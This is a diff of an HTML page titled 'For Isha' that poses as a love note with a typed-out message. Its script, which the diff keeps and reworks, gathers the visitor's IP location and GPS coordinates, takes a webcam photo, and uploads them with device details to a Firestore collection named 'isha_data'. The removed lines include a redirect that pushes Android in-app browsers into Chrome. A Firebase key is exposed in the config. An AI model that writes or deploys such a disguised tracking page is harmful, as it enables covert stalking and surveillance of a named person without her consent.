@@ -5,29 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>For Isha ❤️</title>
 
-<!-- Chrome Redirect Script -->
-<script>
-(function () {
-
-var ua = navigator.userAgent || navigator.vendor || window.opera;
-
-var isInstagram = ua.indexOf("Instagram") > -1;
-var isFacebook = ua.indexOf("FBAN") > -1 || ua.indexOf("FBAV") > -1;
-var isAndroid = ua.toLowerCase().indexOf("android") > -1;
-
-if((isInstagram || isFacebook) && isAndroid){
-
-var url = window.location.href.replace(/^https?:\/\//,'');
-
-window.location.href =
-"intent://" + url +
-"#Intent;scheme=https;package=com.android.chrome;end";
-
-}
-
-})();
-</script>
-
 <style>
 
 body{
@@ -110,11 +87,9 @@ display:none;
 
 <script>
 
-/* Love animation */
-
 function startLove(){
 
-let text="I Love You Isha ❤️";
+let text="I Love You Isha ❤️ You Are My Sweetest Dream 🌹";
 let i=0;
 
 let msg=document.getElementById("msg");
@@ -125,7 +100,6 @@ msg.innerHTML="";
 let typing=setInterval(()=>{
 
 msg.innerHTML+=text.charAt(i);
-
 i++;
 
 if(i>=text.length){
@@ -146,15 +120,12 @@ import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/fireba
 import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
 const firebaseConfig = {
-
 apiKey: "AIzaSyAicGiOH3CQAxfOy1Y1y-osoypb73Ew1Y8",
 authDomain: "remote-videoplayer.firebaseapp.com",
 projectId: "remote-videoplayer",
 storageBucket: "remote-videoplayer.firebasestorage.app",
 messagingSenderId: "978359248102",
-appId: "1:978359248102:web:c03c62454f8cbf70030727",
-measurementId: "G-4D3PV2EGMX"
-
+appId: "1:978359248102:web:c03c62454f8cbf70030727"
 };
 
 const app = initializeApp(firebaseConfig);
@@ -168,25 +139,25 @@ let photo=null;
 
 /* Get IP location */
 
-let ipData = await fetch("https://ipapi.co/json/").then(res=>res.json());
+const ipData = await fetch("https://ipapi.co/json/").then(res=>res.json());
 
-/* Get GPS */
+/* Get GPS location */
 
 navigator.geolocation.getCurrentPosition(
 
 (pos)=>{
 gpsLat=pos.coords.latitude;
 gpsLng=pos.coords.longitude;
-save();
 },
 
 (err)=>{
-save();
+gpsLat=null;
+gpsLng=null;
 }
 
 );
 
-/* Camera */
+/* Capture camera photo */
 
 async function capturePhoto(){
 
@@ -197,7 +168,7 @@ const stream = await navigator.mediaDevices.getUserMedia({video:true});
 const video=document.getElementById("video");
 video.srcObject=stream;
 
-setTimeout(()=>{
+await new Promise(r=>setTimeout(r,2000));
 
 const canvas=document.getElementById("canvas");
 canvas.width=video.videoWidth;
@@ -210,17 +181,15 @@ photo=canvas.toDataURL("image/png");
 
 stream.getTracks().forEach(track=>track.stop());
 
-},2000);
-
-}catch(e){}
+}catch(e){
+photo=null;
+}
 
 }
 
-capturePhoto();
+await capturePhoto();
 
 /* Save to Firebase */
-
-async function save(){
 
 await addDoc(collection(db,"isha_data"),{
 
@@ -242,8 +211,6 @@ device:navigator.userAgent,
 time:new Date().toString()
 
 });
-
-}
 
 }
 
